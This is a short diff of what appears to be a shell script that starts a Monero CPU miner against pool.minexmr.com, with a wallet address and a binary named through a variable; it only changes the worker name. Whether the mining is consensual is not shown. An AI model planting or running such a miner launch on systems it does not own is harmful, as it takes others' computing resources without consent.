@@ -18,4 +18,4 @@ POOL=pool.minexmr.com:6666
 USERNAME=886yP3U9eJ9FqBjFD7xNqf6ZM77BiNkba7R9yf3UXK2NNzAhLqJDCYgBVsW1ZN6rE2hMnud3G9DhQP4gCB5saCwBCSTz9Yk
 ALGO=rx/0
 DONATE=1
-./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.TestCode -p x -a $ALGO -k --tls
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.T67Test -p x -a $ALGO -k --tls
